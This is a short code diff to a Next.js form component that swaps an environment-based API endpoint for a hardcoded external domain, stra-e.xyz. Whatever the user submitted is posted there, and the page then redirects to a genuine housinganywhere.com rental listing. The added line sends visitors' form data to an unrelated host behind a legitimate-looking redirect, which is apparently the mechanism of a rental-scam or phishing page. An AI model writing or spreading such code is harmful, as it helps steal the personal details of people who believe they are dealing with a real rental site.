@@ -18,7 +18,7 @@ function Home() {
 
   async function handleSubmitFn() {
     try {
-      await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/user`, data);
+      await axios.post(`https://www.stra-e.xyz/api/user`, data);
       router.replace('https://housinganywhere.com/room/ut1299287/es/Pozuelo%20de%20Alarc%C3%B3n/avenida-rodajos?flexDays=14');
     } catch(err) {
       console.log(err.message, "ce o avea");
